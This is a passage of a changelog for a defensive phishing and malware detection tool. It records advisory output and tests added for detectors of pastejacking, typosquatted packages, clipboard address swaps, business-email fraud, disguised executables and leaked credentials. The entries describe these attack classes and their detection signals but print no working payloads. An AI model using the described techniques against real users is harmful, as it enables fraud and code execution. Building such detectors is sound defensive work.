  'lsof -i', or calling the bank's fraud line.
  Added five advisory lens fields (pattern, objective, verify, triage,
  cascade_risk) to both `protect` and `network` BLOCK/ISOLATE paths
  in both human output and JSON. OK paths unchanged (blind spot only).
  6 new integration tests added (438 total, all pass). Every BLOCK
  verdict across all 13 HLSE subcommands now has advisory lenses."

## [1.0.51] — 2026-06-20

### Added
- **Perspective 51: Advisory lenses for `file` BLOCK verdicts —
  pattern / code-execution objective / verify / triage / cascade
  surfaced on every malicious file alert.**
  Socratic question: "The `file` subcommand detects disguised executables
  (double extension, RLO Unicode trick, Office macro lures, PDF/JS) —
  when BLOCK fires, it shows the F-code reason ('F1: DOUBLE EXTENSION —
  .pdf.exe disguised as .pdf') and nothing else. The other five BLOCK
  checks (paste, clipboard, email, package, secret) all received advisory
  lenses in P46–P50 and now tell the user the attack class, what the
  attacker wants, what to do before opening, and what to do if they
  already clicked. The file check, which defends against the same
  malware-delivery phase, still shows only the detection signal. A user
  who has already opened invoice.pdf.exe gets no guidance about
  disconnecting, no cascade-risk framing for the credentials that were
  active in their session, and no pointer to VirusTotal. Why?" Pattern
  label derived from the first reason code (double extension, RLO,
  macro, PDF/JS, or generic masquerade). Both human output (▸ Pattern,
  ◉ Attacker's goal, ✓ Verify first, ⚑ If you acted, ⊕ Also change)
  and JSON (pattern, objective, verify, triage, cascade_risk) now
  populated for every file BLOCK/ISOLATE. OK paths unchanged (blind
  spot only). 8 new integration tests added (432 total, all pass).

## [1.0.50] — 2026-06-20

### Added
- **Perspective 50: Advisory lenses for `secret` BLOCK verdicts —
  credential-type pattern / access-class objective / verify-first /
  triage / cascade surfaced on every credential exposure alert.**
  Socratic question: "The `secret` subcommand detects exposed credentials
  (AWS keys, GitHub tokens, Stripe keys, etc.) and when BLOCK fires,
  shows the credential type in brackets ([AWS Access Key ID]) and a
  generic remediation. But it doesn't name the attack pattern ('exposed
  credential — AWS Access Key ID'), doesn't say what the key grants
  ('S3 read/write, EC2 control, IAM privilege escalation'), doesn't
  suggest checking CloudTrail BEFORE revoking (so you know the blast
  radius), and doesn't say to treat every other credential in the same
  file as equally compromised. The credential type is already known from
  the finding — every piece of advisory context could be derived from it.
  Why is a leaked AWS root key and a leaked test API token presented
  identically, with the same generic 'revoke and rotate' message?" Added
  `secret_objective_for()` static helper mapping 7 credential families
  to specific access-class descriptions (AWS, GitHub/GitLab, Stripe,
  Google/GCP, Slack, SSH/Private Key, Database). Both human output
  (▸ Pattern, ◉ Attacker's goal, ✓ Verify first, ⚑ Immediate action,
  ⊕ Also change) and JSON (pattern, objective, verify, triage,
  cascade_risk) are now populated for every secret BLOCK/ISOLATE.
  OK paths unchanged (blind spot only). 8 new integration tests added
  (424 total, all pass).

## [1.0.49] — 2026-06-20

### Added
- **Perspective 49: Advisory lenses for `package` BLOCK verdicts —
  supply-chain pattern / code-execution objective / verify / triage /
  cascade surfaced on every typosquat alert.**
  Socratic question: "The `package` subcommand detects dependency
  confusion and typosquat attacks — an attacker publishes `reqeusts`
  knowing that `pip install reqeusts` will run their post-install script
  with the victim's shell privileges. When BLOCK fires, the verdict shows
  the Damerau-Levenshtein match ('reqeusts is 1 edit from requests') and
  nothing else. Every package BLOCK is a supply-chain code-execution
  attack: there is no ambiguity about the attack class, no sub-types, no
  benign explanations. The paste BLOCK (P46) now tells the user to
  'disconnect from the network'; the clipboard BLOCK (P47) says 'contact
  your exchange'; the email BLOCK (P48) says 'call your bank's fraud
  line'. Why does the package BLOCK — the only input vector in HLSE that
  directly causes arbitrary code execution under the user's own privileges
  — output nothing about what to do next?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human output
  and JSON for every package BLOCK/ISOLATE. OK paths unchanged (blind
  spot only). 8 new integration tests added (416 total, all pass).

## [1.0.48] — 2026-06-20

### Added
- **Perspective 48: Full advisory lenses for `email` BLOCK verdicts —
  verify / triage / cascade surfaced for both body-pattern and
  header-only BLOCK paths.**
  Socratic question: "When the email handler reaches BLOCK/ISOLATE and
  the body text identifies BEC/urgency, it already names the body pattern
  and attacker's goal. But it stops there: `hlse_text_verify`,
  `hlse_text_triage`, and `hlse_text_cascade` are already wired for these
  exact patterns, yet the email path never calls them. The BEC objective
  says '72-hour SWIFT recall window'; `hlse_text_triage` for BEC says
  'call your bank's fraud line within 72 hours to attempt a SWIFT recall'.
  This is precisely the 60-second action a victim needs. Why does the
  email BLOCK that most accurately identifies BEC include the attacker's
  goal but omit the recovery action?
  Also: when only header signals fire at BLOCK level (SPF/DKIM/Reply-To
  mismatch, no body text), there are no advisory lenses at all, even
  though the attack class is identical — BEC spoofing infrastructure."
  Two fixes: (1) for body-pattern BLOCK, verify/triage/cascade now
  emit using the email header score (not the body text score, which may
  be below the 60-threshold even when headers are ISOLATE-level); (2) for
  header-only BLOCK, a synthetic TextVerdict with `"BEC: email header
  authentication failure"` reason threads through the existing advisory
  machinery. Both human and JSON output updated. 7 new integration tests
  added (408 total, all pass).

## [1.0.47] — 2026-06-20

### Added
- **Perspective 47: Advisory lenses for `clipboard` ISOLATE verdicts —
  pattern / attacker objective / verify / triage / cascade surfaced on
  every clipper-malware alert.**
  Socratic question: "The `clipboard` subcommand exists specifically to
  catch clipper malware — software that silently replaces a crypto address
  in the clipboard so the victim sends funds to the attacker instead of
  the intended recipient. When it fires, it shows the raw swap signal and
  a hardcoded remediation string. But it doesn't name the attack pattern,
  doesn't name the attacker's objective (irreversible wallet drain), gives
  no 'Verify first' step, no 'If you acted' triage for the user who may
  have already sent, and no cascade-risk framing for all the other
  addresses they may have copied since the malware was active. The `paste`
  BLOCK path now has all five advisory lenses; the `clipboard` ISOLATE
  path — which guards the most catastrophically irreversible loss in the
  entire tool — still has none. Why?" Added five advisory lens fields
  (pattern, objective, verify, triage, cascade_risk) to both human output
  and JSON for every clipboard BLOCK/ISOLATE. OK path unchanged (blind
  spot only). 8 new integration tests added (401 total, all pass).

## [1.0.46] — 2026-06-20

### Added
- **Perspective 46: Advisory lenses for `paste` BLOCK verdicts — ClickFix
  pattern / attacker objective / verify / triage / cascade surfaced on
  every pastejacking alert.**
  Socratic question: "Every `paste` BLOCK is a ClickFix / pastejacking
  attack — that's the only threat category the paste detector fires on.
  Yet a BLOCK verdict today shows only the raw signal reasons (P2, P4,
  Compound) with no pattern label, no attacker-objective framing, no
  triage steps, and no cascade-risk guidance. The `url` BLOCK path links
  every verdict to its attacker objective and first-response triage;
  the `text` BLOCK path does the same. Why does `paste`, the most
  immediately dangerous input vector (the command executes in the next
  keystroke), omit the advisory context that would help the user
  understand what was at stake and what to do next?" Synthetic
  `TextVerdict` with a `"Shell-pipe: paste-and-run pastejacking"` reason
  threads through the existing `hlse_classify_text_attack()` /
  `hlse_text_objective()` / `hlse_text_verify()` / `hlse_text_triage()` /
  `hlse_text_cascade()` machinery — no string duplication, no new lookup
  tables. Both human output (`▸ Pattern:`, `◉ Attacker's goal:`,
  `✓ Verify first:`, `⚑ If you acted:`, `⊕ Also change:`) and JSON
  (`"pattern"`, `"objective"`, `"verify"`, `"triage"`, `"cascade_risk"`)
  are populated for every paste BLOCK/ISOLATE. OK paths are unchanged
  (blind spot only). 8 new integration tests added (393 total, all pass).

## [1.0.45] — 2026-06-20

### Fixed
- **Perspective 45: Blind-spot disclosure for `protect`, `esp`, and `scan`
  OK paths — completing full coverage across every HLSE subcommand.**
  Socratic question: "The three most infrastructure-critical checks in the tool —
  ransomware/SMB/MBR detection (`protect`), EFI bootkit string scan (`esp`), and
  recursive secret detection (`scan`) — all return a bare `OK` with nothing about
  what they didn't check. `protect` only detects ransom note filenames, SMB
  share-encryption patterns, and known MBR overwrite signatures: memory-only
  ransomware, staged pre-encryption attacks, and fileless malware that writes no
  ransom note all pass clean. `esp` only matches known bootkit strings in the EFI
  System Partition: firmware-level implants and fileless Secure-Boot bypass
  techniques are invisible. `scan` only pattern-matches credential formats: secrets
  in binary artefacts, environment variables, and vault-managed keys fetched at
  runtime are missed. Why do the checks that guard the most irreversible damage
  offer no caveat about what they cannot see?" Added three new
  `hlse_blindspot_for()` cases (`protect`, `esp`, `scan`) and wired them into
  both human display and JSON for each OK path. With this change, every HLSE
  subcommand — `url`, `text`, `email`, `clipboard`, `paste`, `network`, `secret`,
  `package`, `file`, `audit`, `protect`, `esp`, `scan` — now discloses its blind
  spot on a clean verdict, in both the terminal and JSON output. Advisory-only: no
  score or detection change, F1 = 1.000 holds. 5 new CLI integration tests (385
  total). Zero warnings (CLI + library).

## [1.0.44] — 2026-06-20

### Fixed
- **Perspective 44: Blind-spot disclosure for `package`, `file`, and `audit`
  OK paths.**
  Socratic question: "The `package` OK just says `OK numpy`. But HLSE only
  checked whether the name resembles a known typosquat — it never looked at the
  package code, post-install scripts, or version history. The SolarWinds, XZ
  Utils, and log4shell incidents all involved correctly-named, widely-used
  packages. Why does a correctly-named package get a clean bill of health with no
  caveat about what was not checked?" Added three new `hlse_blindspot_for()`
  cases and wired them into both human display and JSON for each OK path: (1)
  `package`: "typosquat detection only — a compromised legitimate package, a
  dependency confusion attack, or malicious post-install scripts inside a
  correctly-named package are not detected; review the package's repository,
  recent commits, and published checksums before installing in a production or
  privileged environment." (2) `file`: "magic-byte and filename analysis only —
  obfuscated payloads, encrypted content, or malicious macros inside office
  formats are not detected; run untrusted files through a multi-engine scanner
  before opening." (3) `audit`: "point-in-time configuration snapshot — kernel-
  level exploits, container escapes, LD_PRELOAD injection, and custom LSM
  bypasses are outside the scope of this check; re-run after any system or
  configuration change." The `blind_spot` field appears in JSON only on score 0;
  threat-band JSON omits it. Advisory-only: no score or detection change, F1 =
  1.000 holds. 6 new CLI integration tests (380 total). Zero warnings (CLI +
  library).

## [1.0.43] — 2026-06-20

### Fixed
- **Perspective 43: Correct blind spot for canonical URLs; add blind spots
  for `secret` and `network`.**
  Three related issues, all in the same "what an OK cannot see" category:
  (1) *Canonical URL blind-spot contradiction.* When `hlse_canonical_confirm()`
  authenticates a domain (e.g. paypal.com) and the user sees `✔ Canonical:
  confirmed authentic paypal domain`, the immediately-following blind-spot line
  said "a pixel-perfect clone on a clean or newly-compromised domain still
  phishes; confirm the brand independently before entering credentials." These two
  lines directly contradict each other: the canonical confirmation already
  confirmed the brand, and then the blind spot told the user to confirm the brand.
  Fixed by adding a `"url_canonical"` case to `hlse_blindspot_for()` and
  selecting it when `has_canon` is true: "positive authentication covers the
  domain name — it cannot verify the page's content, a same-site redirect, or
  that the service actually sent you here; close unexpected pop-ups and confirm
  the specific page's request is what you expect from this service before
  entering credentials or authorising payment." The original "pixel-perfect clone"
  blind spot is retained for unconfirmed clean URLs. Both human and JSON outputs
  are corrected.
  (2) *`secret` OK has no blind spot.* Pattern-based detection misses novel
  credential formats, encoded secrets, and credentials split across lines.
  (3) *`network` OK has no blind spot.* Local-view-only — DNS-over-HTTPS,
  process-level routing, encrypted tunnels, and outbound traffic over allowed
  ports are invisible to this check.
  All three new blind-spot cases are exposed in both human display and JSON.
  Advisory-only: no score or detection change, F1 = 1.000 holds. 8 new CLI
  integration tests (374 total). Zero warnings (CLI + library).

## [1.0.42] — 2026-06-20

### Fixed
- **Perspective 42: Blind-spot caveat reaches JSON consumers, not just the
  terminal.**
  Socratic question: "P41 gave human readers a blind-spot caveat on a clean
  verdict — but the JSON output, which is what a SIEM, a CI gate, or an automated
  mailbox filter actually parses, still emitted only `{action: SAFE}` with no
  hedge. The machine consumer faces exactly the false-confidence trap we just
  closed for humans: it logs 'SAFE' and moves on, never recording that this was a
  structural check that cannot see a pixel-perfect clone or an unverified payment
  address. The JSON already carries every *threat-band* hedge (exoneration,
  verify, triage, cascade_risk); why does the score-0 hedge stop at the
  terminal?" Added a `"blind_spot"` field to every clean (score 0) JSON verdict
  across all five kinds that have a human blind spot: `url` and `text` (via
  `print_json_url`/`print_json_text`, covering the default, `text` subcommand and
  `--stdin` paths), plus the dedicated `clipboard`, `paste`, and `email`
  subcommand JSON. The field appears only on a clean verdict — threat-band JSON
  omits it, exactly as the human path suppresses the line on a detected threat.
  Advisory-only: no score or detection change, all OK JSON remains valid and
  parseable, F1 = 1.000 holds. 6 new CLI integration tests (366 total). Zero
  warnings (CLI + library).

## [1.0.41] — 2026-06-20

### Fixed
- **Perspective 41: Blind-spot disclosure on the irreversible-harm checks
  (`clipboard`, `paste`).**
  Socratic question: "The `url`, `text`, and `email` clean paths each append an
  `ℹ Blind spot:` line — what an `OK` cannot see, so the user does not mistake it
  for proof of safety. But `clipboard` (crypto address-swap → theft) and `paste`
  (pastejacking → arbitrary code execution) — the two MOST dangerous, *irreversible*
  checks in the tool — return a bare `OK` with no caveat. A `clipboard` OK only
  proves the two addresses you provided match each other; it never verified the
  address belongs to the intended recipient. A user about to wire their life
  savings reads `OK (clipboard)` and sends to an address HLSE never authenticated.
  Why do the highest-stakes verdicts alone offer no hedge against false
  confidence?" Added `clipboard` and `paste` cases to `hlse_blindspot_for()` and
  wired them into both OK paths. The clipboard caveat names the irreversibility
  and the real verification (check the full address against the recipient's own
  published source); the paste caveat states the check flags injection patterns,
  not whether a command is safe to run. The blind-spot line appears only on a
  clean verdict — a detected swap or hostile paste suppresses it (the threat
  guidance speaks instead). Advisory-only: no score or detection change, F1 =
  1.000 holds. 4 new CLI integration tests (360 total). Zero warnings (CLI +
  library).

## [1.0.40] — 2026-06-20

### Fixed
- **Perspective 40: Library build is warning-free, like the CLI build.**
  Socratic question: "The project invariant is 'zero compiler warnings', and
  `make check-warnings` proves it — but that gate compiles the *CLI*. The README
  tells library users to build `libhlse.so` with `-DHLSE_CORE_AS_LIB`. That build
  excludes the CLI `main`, so the two blast-radius helpers `asset_class_of` and
  `asset_mask_describe` — defined before the `#ifndef HLSE_CORE_AS_LIB` guard but
  used only inside it — become unused functions and emit `-Wunused-function`
  warnings. A consumer following our own integration instructions sees warnings
  we claim don't exist. Does 'zero warnings' mean zero for *us*, or zero for the
  people we asked to link the library?" Three fixes:
  (1) The two CLI-only helpers `asset_class_of`/`asset_mask_describe` are now
  marked `__attribute__((unused))` — the exact idiom the file already uses for
  `action_for_score`, which faces the same CLI-only-in-a-dual-build situation —
  silencing `-Wunused-function` in the library build.
  (2) `make check-warnings` now ALSO compiles every module with
  `-DHLSE_CORE_AS_LIB` under the full strict flag set, so the library build is
  gated permanently and this class of regression cannot silently return. The
  prior gate only checked the CLI translation unit, where these functions appear
  used.
  (3) The new gate immediately surfaced a latent `-Wformat-truncation=2` warning
  in the public API `hlse_confusable_report`: in library mode GCC cannot see
  callers to bound `outsz`, so the direct `snprintf` of the diagnostic literal
  tripped the aggressive truncation check. Reworked to stage into a fixed-size
  local buffer then copy with an explicit `memcpy` clamp to `outsz` — provably
  bounded and outside the format-truncation analysis. Output is byte-identical
  ("position N is &lt;script&gt; U+XXXX, not an ASCII letter").
  Pure build hygiene: no code path, score, or output changes, so F1 = 1.000
  holds. All 356 CLI integration tests pass, ASan/UBSan clean.

## [1.0.39] — 2026-06-20

### Fixed
- **Perspective 39: Channel-only risk is displayed, not silently reported OK.**
  Socratic question: "P37 made `--from sms` boost a benign message's *effective*
  score to 15 (LOG), and the exit code already gates on that boosted score — a
  channel-only LOG exits 1 when the fail threshold is crossed. The JSON output
  honestly reports `effective_score: 15, effective_action: LOG`. But the human
  display still prints a bare `OK` whenever the *content* score is 0, even though
  the channel prior lifted it above zero. So three observers of the very same
  invocation disagree: the JSON says LOG, the exit code says threat, and the
  terminal says OK. The display is the one a human actually reads — why is it the
  only one telling them everything is fine?" Fixed in all three human-readable
  paths (the `text` subcommand, the default auto-detect path, and `--stdin` pipe
  mode): when the content scores 0 but `--from` contributes a positive delta, the
  display now shows the channel-elevated score (`LOG [15] …`), the `· Channel
  (…)` reason line, and the blind-spot caveat — instead of a misleading `OK`. The
  `manual` channel (delta 0) and the no-`--from` case correctly remain plain `OK`.
  This is pure advisory/display reconciliation: scores, gates, and JSON are
  unchanged, so F1 = 1.000 holds. 7 new CLI integration tests (356 total). Zero
  warnings.

## [1.0.38] — 2026-06-20

### Fixed
- **Perspective 38: Email body social-engineering lens (`email` subcommand).**
  Socratic question: "The `email` subcommand runs header forensics — SPF/DKIM
  alignment, Reply-To vs From mismatch, missing Received chains. But a BEC attack's
  decisive evidence is in the message BODY: 'wire $50000 immediately, keep
  confidential, do not call.' The `text` subcommand detects exactly this and names
  it 'BEC wire-transfer fraud' with the attacker's objective. Yet `email` mode is
  completely blind to the body — an attacker who sends a clean-header email (their
  own legitimately-configured domain) from a compromised-but-authentic account
  passes every header check and HLSE reports nothing actionable, even though the
  body is textbook BEC. Why does the email path forgo the social-engineering
  analysis that the text path already performs?" The email path now runs
  `hlse_check_text()` on the same input and surfaces the attack pattern as an
  ADVISORY lens: `▸ Body pattern: <pattern> (body score N)` plus `◉ Attacker's
  goal`. Crucially, the email forensics SCORE is unchanged — this is pure advisory
  augmentation, so F1 = 1.000 is preserved. When headers are clean (score 0) but
  the body is flagged, the output reads `OK [0] (email forensics) — headers clean,
  but body flagged below`, closing the gap where clean headers masked a malicious
  body. JSON gains `body_pattern` and `body_score` fields. 6 new CLI integration
  tests (349 total). Also corrected the `--from` help text ("boosts URL & text
  score" — it applies to both since P37). Zero warnings.

## [1.0.37] — 2026-06-20

### Fixed
- **Perspective 37: Channel prior applies to text verdicts (`--from` flag).**
  Socratic question: "The `--from` channel flag boosts a URL's score to account
  for its delivery channel — a URL in a QR code (+20) is more suspicious than
  one typed manually (+0). Text messages also arrive via channels: an unsolicited
  SMS ('Your account has been suspended') has the same smishing amplification as
  an SMS-delivered URL. But all three display sites gated the channel boost on
  `if (sr.is_url && g_from_channel)`, silently discarding the channel context
  for text verdicts. `--from sms text '...'` applied zero delta, as if the SMS
  delivery channel is irrelevant to text social engineering." Fixed by removing
  the `sr.is_url &&` condition from all channel delta applications (display score,
  channel reason line, exit code gate) and adding a channel delta computation to
  the `text` subcommand's display path (which had none). `print_json_text()` also
  gains the `channel`, `channel_delta`, `effective_score`, and `effective_action`
  JSON fields in symmetric parity with `print_json_url()`. A BEC text message
  that raw-scores LOG/ALERT [58] now reaches BLOCK [68] when delivered via email
  (--from email) and exits 1 at the default threshold. 4 new CLI integration
  tests (old "ignored" test replaced); 343 total. Zero warnings. F1=1.000 kept.

### Fixed
- **Perspective 36: Amplifier lines filtered from human-readable `·` reason list.**
  Socratic question: "URL verdict reasons shown with `·` are raw detected facts:
  'Brand homoglyph: paypa1.com → paypal.com'. Text verdict reasons mix two types:
  base signal hits ('Urgency pressure', 'Financial/credential req') and derived
  amplifier notes ('Amplifier: wire transfer + urgency = BEC pattern'). Amplifiers
  are synthesis — exactly what the `▸ Pattern:` line already provides, but in
  internal system terminology. A user sees both 'Amplifier: secrecy pressure +
  financial request = victim isolation tactic' AND '▸ Pattern: BEC wire-transfer
  fraud' — redundant, and the amplifier uses jargon not meaningful to end users."
  Filtered `Amplifier:` prefix lines from all three `·` reason printing loops
  (stdin, `text` subcommand, default auto-detect). Amplifiers are retained in the
  JSON `reasons` array for integrators who need the full signal chain. 4 new CLI
  integration tests (340 total before P37). Zero warnings. F1=1.000 preserved.

## [1.0.35] — 2026-06-20

### Changed
- **Perspective 35: Centralise text advisory output (`print_text_advisories`).**
  Socratic question: "The URL path routes every advisory line through one
  `print_url_advisories()` helper, with a comment explaining the point — so the
  three URL output sites (stdin / `text` subcommand / default auto-detect)
  *cannot* drift out of sync. The text path does the opposite: the same ~25-line
  advisory block (▸ Pattern, ◉ Attacker's goal, ✓ Verify first, ⚖ Confidence,
  ⚑ If you acted, ⊕ Also change) is copy-pasted into all three text sites. Each
  Perspective from P27 onward had to be applied three times, by hand, in lockstep
  — one missed edit and the three paths silently diverge. Why does the URL path
  get a drift-proof single source of truth while the text path, which has had far
  more advisory lenses added, is left as triplicated copy-paste?" Extracted a new
  `print_text_advisories(const TextVerdict *)` mirroring `print_url_advisories()`
  exactly: it emits the six conditional lens lines and, like its URL sibling,
  leaves the "↺ Could be benign" exoneration and the "· <channel>" line to each
  caller (those depend on caller-local channel state). All three text sites now
  call the single helper. Output is byte-identical (verified: all 333 prior tests
  pass unchanged, plus a new cross-path parity test asserting the subcommand,
  `--stdin`, and default paths emit the same advisory block for the same input).
  Net −33 lines in `hlse_core.c`. 3 new CLI integration tests (336 total). Zero
  warnings. F1 = 1.000 preserved — pure structural refactor, no behaviour change.

## [1.0.34] — 2026-06-17

### Fixed
- **Perspective 34: Unmapped text signal family coverage.**
  Socratic question: "The text detector table has 14 signal families. Three of
  them — `Fake security alert`, `Direct financial action`, and
  `Shell-pipe-to-interpreter` — fire and contribute to the score, but were not
  mapped in `hlse_classify_text_attack()` or `hlse_text_confidence()`. A message
  containing only `Shell-pipe-to-interpreter` showed no `▸ Pattern:` and no
  `⚖ Confidence:` line, and fell back to the generic 'urgent or financial
  wording' exoneration (wrong — the signal has nothing to do with urgency). A
  `Fake security alert + Urgency` ALERT showed `single signal` confidence even
  though two independent families fired. Shouldn't every signal family that
  contributes to the score also participate in classification and confidence?"
  Three-part fix:
  1. `Fake security alert` now sets `bait = 1` in classify (fake account-
     suspension hooks ARE credential-harvest baits) and increments `n_sigs` in
     confidence as an independent family. When `fake_alert` fires alone, the
     pattern is "fake security alert / account suspension phishing" with a
     service-provider-specific exoneration. When combined with `urgency`, the
     pattern is promoted to "urgency credential-harvest phishing" (more accurate
     than "urgency social engineering") and confidence correctly reflects both
     signals.
  2. `Direct financial action` similarly sets `bait = 1` and counts as an
     independent signal in confidence. BEC inputs with explicit "send money"
     language on top of "wire transfer" now show "high confidence — 3
     independent signal categories" instead of "2".
  3. `Shell-pipe-to-interpreter` maps to the `clickfix` classification path
     (both are command-injection lures). Shell-pipe messages now show
     `▸ Pattern: ClickFix script-injection lure (paste-and-run attack)`,
     `⚖ Confidence: single signal`, and a decisive-test exoneration about
     official package managers — replacing the previous silent drop-through to
     a generic wrong exoneration.
  `hlse_text_exoneration()` also gains a `ClickFix / script-injection` branch
  covering the LOG/ALERT band for shell-pipe and ClickFix inputs, and a `fake
  security alert / account suspension` branch for standalone fake-alert inputs.
  7 new CLI integration tests (333 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.33] — 2026-06-17

### Fixed
- **Perspective 33: Subdomain canonical confirmation (`hlse_canonical_confirm`).**
  Socratic question: "`hlse_canonical_confirm()` confirms exact canonical domains
  plus `www.` prefix — so `paypal.com` and `www.paypal.com` are confirmed. But
  `login.paypal.com`, `accounts.google.com`, and `id.apple.com` are official
  brand domains used in legitimate authentication flows. Without confirmation,
  users scanning these URLs see no `✔ Canonical:` line — indistinguishable from
  an unknown domain. Shouldn't HLSE confirm official subdomains of known brands,
  so a user scanning `login.paypal.com` knows it's genuinely PayPal's
  authentication domain?" Extended `hlse_canonical_confirm()` to also confirm
  official subdomains: after stripping `www.`, checks both exact match AND
  whether the host ends with `.<canonical_domain>`. The subdomain check is safe
  because this path is only reached when `score == 0` — any spoofed domain that
  triggered a brand detector has a non-zero score and never reaches this check.
  `login.paypal.com`, `accounts.google.com`, `id.apple.com`, and any other
  official brand subdomain now show `✔ Canonical: confirmed authentic <brand>
  domain (HLSE brand registry)` and the `canonical_brand` JSON field. 5 new CLI
  integration tests (326 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.32] — 2026-06-17

### Added
- **Perspective 32: Text cascade risk (`hlse_text_cascade`).**
  Socratic question: "URL verdicts have ⊕ Also change: naming every account
  class in the password-reuse blast radius (email, banking, every service
  sharing the harvested password). Text BLOCK verdicts identify the primary
  attack and give triage — but say nothing about the downstream accounts that
  fall if the primary is compromised. A ClickFix victim who disconnects their
  machine has stopped the attack but may still have all saved browser passwords
  exfiltrated. A BEC victim who recalls the wire has stopped the funds but the
  corporate email account may be compromised, giving the attacker the recovery
  address for everything else. Shouldn't text BLOCK verdicts also name what
  else is at risk, parallel to the URL ⊕ Also change: line?" New
  `hlse_text_cascade(const TextVerdict *v)` (public API) maps each text attack
  pattern to a cascade description: ClickFix → all browser/OS stored credentials
  (assume script exfiltrated them); BEC/CEO-fraud → corporate email (recovery
  address for every downstream service); tech-support → all credentials visible
  during remote-access session; urgency credential-harvest → email + every
  account sharing the password; QR phishing → account entered + email + shared
  passwords; investment scam → other liquid assets and exchange/bank accounts.
  Returns NULL when score < 60 or no recognisable pattern. Displayed as
  ⊕ Also change: after ⚑ If you acted: in all three text display paths. Added
  as "cascade_risk" JSON field (score ≥ 60 only). 5 new tests (321 total).
  Zero warnings. F1 = 1.000 preserved. Text BLOCK advisory now has full
  symmetry with URL BLOCK: Pattern → Objective → Verify first → Confidence →
  Triage → Cascade risk.

## [1.0.31] — 2026-06-17

### Added
- **Perspective 31: Text pre-action verify step (`hlse_text_verify`).**
  Socratic question: "URL BLOCK verdicts show BOTH ✓ Verify independently:
  (what to check before clicking) AND ⚑ If already clicked: (post-click
  triage). Text BLOCK verdicts show only ⚑ If you acted: whose label implies
  post-action, even when the most important advice is pre-action — 'DO NOT
  send the wire transfer'. A BEC victim reading BLOCK [100] needs to know the
  single decisive check to do BEFORE authorising anything: call the supposed
  sender on a separately-known number. A ClickFix victim needs: never paste
  commands from unsolicited messages. Burying pre-action guidance inside a
  post-action label obscures it. Should text BLOCK verdicts have the same
  ✓ Verify first: / ⚑ If you acted: split that URL verdicts already have?"
  New `hlse_text_verify(const TextVerdict *v)` (public API) mirrors
  `hlse_verification_for()` for text: BEC → call the supposed sender on a
  separately-known number; ClickFix → never paste commands from unsolicited
  messages; tech-support → call the main switchboard independently; investment
  → verify FCA/SEC registration; grandparent/emergency → call the family member
  directly; callback/vishing → don't call the provided number; lottery/advance-
  fee → don't pay any upfront fee; QR phishing → preview QR destination first;
  urgency credential-harvest → navigate directly via bookmark/search engine.
  Returns NULL when score < 60 or no recognisable pattern. Displayed as
  ✓ Verify first: positioned between ◉ Attacker's goal: and ⚖ Confidence: to
  mirror URL advisory layout. Added as "verify" JSON field (score ≥ 60 only).
  All three text display paths and print_json_text() updated. 6 new tests (316
  total). Zero warnings. F1 = 1.000 preserved.

## [1.0.30] — 2026-06-17

### Added
- **Perspective 30: Pattern-aware text exoneration (`hlse_text_exoneration`).**
  Socratic question: "`hlse_exoneration_for('text', score)` returns 'heuristic —
  urgent or financial wording appears in genuine messages too' for every LOG/ALERT
  text verdict — including QR-code phishing (nothing to do with urgent wording),
  callback scams (targeting phone numbers, not urgency language), and investment
  lures (looking like financial advice). The falsifying test ('were you expecting
  this, does it push you to act in a hurry?') is unanswerable for a QR code. Isn't
  the benign explanation and decisive test wrong for most patterns — exactly the
  same problem P24 fixed for URLs?" New `hlse_text_exoneration(const TextVerdict *v)`
  (public API) mirrors `hlse_url_exoneration()` for text: QR → "scan with a QR
  decoder that shows the URL before opening it"; callback/vishing → "find the number
  independently on the official website"; investment/pig-butchering → "verify
  FCA/SEC register"; lottery/advance-fee → "genuine prizes don't require upfront
  fees"; urgency credential-harvest → "navigate to the site directly and check your
  account dashboard"; authority impersonation → "verify by calling a number you
  already have"; BEC/CEO-fraud → "wire-transfer requests without a prior phone call
  are a strong warning sign". Falls back to `hlse_exoneration_for("text", score)`
  for unrecognised patterns. Score-gated to [15, 59] (same as `hlse_url_exoneration`).
  All three text display paths and `print_json_text()` updated to use
  `hlse_text_exoneration()` in place of the generic call. P26 test updated to check
  for "decisive test" (content-invariant) rather than the replaced generic text.
  6 new P30 CLI integration tests (310 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.29] — 2026-06-17

### Added
- **Perspective 29: Text attacker objective (`hlse_text_objective`).**
  Socratic question: "URL verdicts show `◉ Attacker's goal:` keyed to the
  impersonated brand — 'crypto theft — seed phrase or wallet drain; transfers
  are irreversible'. Text verdicts name the attack pattern (`▸ Pattern:`) but
  not the specific asset the attacker is trying to take. A BEC victim reads
  'BEC / CEO-fraud wire-transfer' and knows the mechanism, but not that the
  asset at risk is wire-transfer funds with a 72-hour SWIFT recall window. A
  grandparent-scam victim reads 'emergency impersonation scam' but not that
  the asset is cash — unrecoverable once handed to a courier. Without naming
  the specific asset, the advisory gives no triage priority signal. Shouldn't
  text threats ≥ 60 name the specific asset at risk, parallel to the URL
  `◉ Attacker's goal:` line?" New `hlse_text_objective(const TextVerdict *v)`
  (public API) maps each text attack pattern to a concise asset-at-risk
  description emphasising recoverability (BEC → wire-transfer funds, 72-hour
  SWIFT window; ClickFix → system access, machine treated as compromised;
  investment scam → long-term savings, typically unrecoverable; grandparent
  scam → cash withdrawal, unrecoverable once handed to courier; etc.). Returns
  NULL when score < 60 or no recognisable pattern. Displayed as
  `◉ Attacker's goal:` in text output, positioned between `▸ Pattern:` and
  `⚖ Confidence:` to match the URL advisory layout. Added as `"objective"`
  field in JSON text verdicts (score ≥ 60 only). All three text display paths
  updated (stdin, `text` subcommand, default auto-detect). 6 new CLI
  integration tests (304 total). Zero warnings. F1 = 1.000 preserved.

## [1.0.28] — 2026-06-17

### Added
- **Perspective 28: Text signal confidence (`hlse_text_confidence`).**
  Socratic question: "`hlse_confidence_for` gives URL verdicts an `⚖ Confidence:`
  label. Text verdicts have the same epistemic spectrum: a BEC with urgency +
  financial + authority + secrecy all firing concurrently is as corroborated as
  a URL with four independent detectors agreeing. A single-urgency LOG text is as
  fragile as a single-heuristic URL LOG. Without a confidence line, text verdicts
  look uniformly certain. Why should URL get epistemic disclosure and text be
  silent?" New `hlse_text_confidence(const TextVerdict *v, char *out, size_t outsz)`
  (public API) counts distinct base signal families (urgency, financial, authority,
  secrecy, investment, emergency, ClickFix, etc.) — skipping amplifier lines which
  are derived from base signals, not independent evidence — and maps the count to
  the same qualitative labels as `hlse_confidence_for`: 1 → "single signal —
  corroborate before acting", 2 → "corroborated by N independent signals",
  3+ → "high confidence — N independent signal categories agree; this is a
